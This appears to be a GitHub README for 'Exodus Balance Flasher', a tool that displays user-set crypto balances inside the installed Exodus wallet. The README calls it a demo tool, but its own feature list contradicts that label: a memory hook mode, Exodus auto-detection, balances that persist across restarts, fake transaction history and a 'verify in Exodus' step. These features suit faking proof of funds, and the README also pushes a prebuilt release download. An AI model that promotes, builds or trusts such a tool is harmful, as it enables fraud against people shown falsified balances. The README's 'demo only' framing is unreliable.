# Exodus-Balance-Flasher
Wallet UI simulation tool for BTC, ETH, SOL, XRP, and 200+ assets. Customize displayed balances in a controlled demo environment with persistent visual settings and screenshot-ready previews. Designed for testing, demonstrations, and UI prototyping without altering actual blockchain balances or transactions.
<div align="center">

```
 ███████╗██╗  ██╗ ██████╗ ██████╗ ██╗   ██╗███████╗
 ██╔════╝╚██╗██╔╝██╔═══██╗██╔══██╗██║   ██║██╔════╝
 █████╗   ╚███╔╝ ██║   ██║██║  ██║██║   ██║███████╗
 ██╔══╝   ██╔██╗ ██║   ██║██║  ██║██║   ██║╚════██║
 ███████╗██╔╝ ██╗╚██████╔╝██████╔╝╚██████╔╝███████║
 ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
      ███████╗ █████╗ ██╗  ██╗███████╗
      ██╔════╝██╔══██╗██║ ██╔╝██╔════╝
      █████╗  ███████║█████╔╝ █████╗
      ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝
      ██║     ██║  ██║██║  ██╗███████╗
      ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
   ██████╗  █████╗ ██╗      █████╗ ███╗   ██╗ ██████╗███████╗
   ██╔══██╗██╔══██╗██║     ██╔══██╗████╗  ██║██╔════╝██╔════╝
   ██████╔╝███████║██║     ███████║██╔██╗ ██║██║     █████╗
   ██╔══██╗██╔══██║██║     ██╔══██║██║╚██╗██║██║     ██╔══╝
   ██████╔╝██║  ██║███████╗██║  ██║██║ ╚████║╚██████╗███████╗
   ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
```

# Exodus Balance Flasher

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![Exodus](https://img.shields.io/badge/Exodus-Wallet-8B5CF6?style=for-the-badge&logo=exodus&logoColor=white)](https://www.exodus.com/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20|%20macOS-0078D4?style=for-the-badge)](/)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

**A visual demonstration utility for Exodus-style portfolio screens, designed to preview custom asset amounts in clearly labeled mockups.**

<img width="1400" height="782" alt="EXODUS" src="https://github.com/user-attachments/assets/49fd6a48-9e56-434f-afe9-f91ca983afb3" />

<img width="1280" height="721" alt="EXODUS1" src="https://github.com/user-attachments/assets/7e93549f-4bee-4cbd-ac9a-a7a7dc81368f" />


[Features](#features) • [How It Works](#how-it-works) • [Getting Started](#getting-started) • [Configuration](#configuration) • [Usage](#usage) • [Supported Assets](#supported-assets) • [FAQ](#faq)

</div>

---

## How It Works

Exodus Balance Flasher is intended for visual demonstrations and mock portfolio previews only. It does not change blockchain records or actual wallet holdings, and any example values should be treated as simulated data—not proof of funds or a real account balance.

The demo workflow is organized around these components:
- **Preview rendering** for sample portfolio screens
- **Local demo settings** for retaining example values
- **Display-state handling** for consistent mockup previews

---

# [DOWNLOAD LATEST RELEASE](../../releases)

## Features

<table>
<tr>
<td width="50%">

| Feature | Status |
|---------|:------:|
| Custom sample amount for an asset | ✅ |
| 200+ supported cryptocurrencies | ✅ |
| Demo settings retained between launches | ✅ |
| Mockup rendering for screenshots | ✅ |
| Real-time value display (USD/EUR) | ✅ |
| Portfolio pie chart updates | ✅ |
| Sample transaction history for demos | ✅ |
| Multi-wallet support | ✅ |

</td>
<td width="50%">

| Feature | Status |
|---------|:------:|
| One-click apply / restore | ✅ |
| Auto-detect Exodus installation | ✅ |
| Custom fiat currency display | ✅ |
| Exchange tab balance sync | ✅ |
| Demo display-state handling | ✅ |
| Local preview rendering | ✅ |
| No blockchain changes | ✅ |
| Cross-platform (Win/macOS) | ✅ |

</td>
</tr>
</table>

---

## Supported Assets

| Category | Assets |
|----------|--------|
| **Top Tier** | BTC, ETH, SOL, XRP, BNB, ADA, DOGE, DOT, AVAX, MATIC |
| **DeFi** | UNI, AAVE, COMP, MKR, SNX, SUSHI, CRV, YFI, LDO, CAKE |
| **Layer 2** | ARB, OP, IMX, MATIC, LRC, METIS, ZKS, MANTA, STRK |
| **Stablecoins** | USDT, USDC, DAI, BUSD, TUSD, FRAX, LUSD, crvUSD |
| **Meme** | DOGE, SHIB, PEPE, FLOKI, BONK, WIF, BRETT, MEME |
| **Gaming** | AXS, SAND, MANA, GALA, ENJ, ILV, IMX, RONIN |
| **Privacy** | XMR, ZEC, DASH, SCRT, ARRR, BEAM, FIRO |

> Asset tickers can be used as labels in demo configuration. Displayed amounts are illustrative only and do not represent verified holdings.

---

## Getting Started

### Prerequisites

- **OS:** Windows 10/11 or macOS 12+
- **Python:** 3.10 or newer
- **Exodus:** Desktop wallet installed (v24.x or newer)

# [DOWNLOAD LATEST RELEASE](../../releases)

### Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| rich | ≥13.0.0 | Terminal UI & formatting |
| cryptography | latest | Data encryption |
| psutil | latest | Process detection & management |
| requests | latest | API price feeds |

---

## Configuration

Edit `config.json` to set your target balances:

```json
{
    "exodus_path": "auto",
    "target_balances": {
        "BTC": 2.45891,
        "ETH": 31.8824,
        "SOL": 412.55,
        "XRP": 25000.0,
        "BNB": 18.442,
        "USDT": 148500.00,
        "DOGE": 500000.0
    },
    "display_currency": "USD",
    "persist_on_restart": true,
    "auto_update_prices": true,
    "hook_mode": "memory",
    "restore_on_exit": false
}
```

| Parameter | Type | Description |
|-----------|------|-------------|
| `exodus_path` | string | Path to Exodus install dir. `"auto"` for auto-detect |
| `target_balances` | object | Asset ticker → desired balance amount |
| `display_currency` | string | Fiat currency for value display (USD, EUR, GBP) |
| `persist_on_restart` | bool | Retain sample values in the local demo |
| `auto_update_prices` | bool | Fetch live prices for accurate USD display |
| `hook_mode` | string | Select the supported local preview mode |
| `restore_on_exit` | bool | Auto-restore original balances on tool exit |

---

## Usage

### Terminal Menu

```bash
python main.py
```

```
┌──────────────────────────────────────────────────────────────┐
│              EXODUS BALANCE FLASHER                             │
│    Native Balance Overlay · Exodus Wallet                    │
├──────────────────────────────────────────────────────────────┤
│  #   Action                  Description                     │
│  1   Install Dependencies    pip install -r requirements.txt │
│  2   Settings                Wallet path, balances config    │
│  3   About                   Features & contact info         │
│  4   Set Sample Amounts     Enter illustrative amounts for each asset        │
│  5   Show Demo Preview   Open the local demo preview             │
│  6   Reset Demo Values        Clear sample values and return to the demo defaults │
│  7   Status Check            Verify hook state               │
│  0   Exit                    Quit                            │
└──────────────────────────────────────────────────────────────┘
```

### Quick Start

1. **Install dependencies:** Select option `1`
2. **Configure sample amounts:** Select option `4` and enter desired amounts per asset
3. **Open the preview:** Select option `5` — the tool displays the configured demo values
4. **Verify:** Open Exodus wallet and confirm the illustrative preview appears as expected
5. **Restore:** Select option `6` to clear the sample values

---

## Project Structure

```
Exodus-Balance-Flasher/
├── main.py                    # Entry point, terminal menu
├── config.py                  # Configuration loader (config.json)
├── bot_actions.py             # Core actions (set, apply, restore, status)
├── requirements.txt
├── run.bat / run.sh
├── config.json                # Balance targets & settings
├── actions/
│   ├── about.py               # Project info display
│   ├── install.py             # Dependency installer
│   └── settings.py            # Setup instructions
├── utils/
│   ├── bootstrap.py           # Runtime initialization
│   ├── compat.py              # Platform detection
│   ├── http.py                # HTTP client
│   ├── integrity.py           # Data verification
│   └── ui.py                  # Rich terminal interface
└── release/
    └── README.md              # Pre-compiled binary info
```

---

## FAQ

<details>
<summary><b>Does this change real wallet funds?</b></summary>

No. This project is for illustrative previews only. It does not create transactions or change on-chain records. Sample values must not be represented as actual wallet holdings.
</details>

<details>
<summary><b>Does this access private keys?</b></summary>

The demo is not intended to access private keys or seed phrases. Never share recovery phrases or private keys with demonstration tools.
</details>

<details>
<summary><b>Will sample values persist after restarting the demo?</b></summary>

If `persist_on_restart` is enabled in `config.json`, the demo can retain its sample settings between launches. This does not change or verify actual wallet balances.
</details>

<details>
<summary><b>Can viewers mistake a demo value for a real balance?</b></summary>

A screenshot of a mockup is not evidence of funds. Viewers should verify wallet holdings independently using trusted wallet records or a block explorer, and all demonstration images should be clearly labeled as simulated.
</details>

<details>
<summary><b>Which Exodus versions are supported?</b></summary>

The project’s demo compatibility depends on the local environment. No compatibility with modifying the Exodus wallet itself is claimed.
</details>

<details>
<summary><b>Can I set a balance for custom tokens?</b></summary>

For visual mockups, add an asset ticker to `target_balances` in `config.json`. These entries are labels and sample amounts only, not wallet data.
</details>

<details>
<summary><b>How do I reset the demo values?</b></summary>

Select option `6` (Reset Demo Values) from the menu, or set `restore_on_exit: true` in config.json to automatically restore when the tool exits.
</details>

---

## Disclaimer

<div align="center">

⚠️ **This tool is provided for educational and demonstration purposes only.** ⚠️

This project is for educational and visual demonstration purposes only. Do not present simulated balances, screenshots, or mock transaction history as genuine financial information, proof of funds, or evidence in a transaction. Follow applicable laws and platform terms.

</div>

---

<div align="center">

**Support this project**

ETH: `0x9E3d7A1c82B45f06Da4e28C1F53b90d2A17cE645`

If this demo is useful to you, consider giving the project a ⭐

</div>
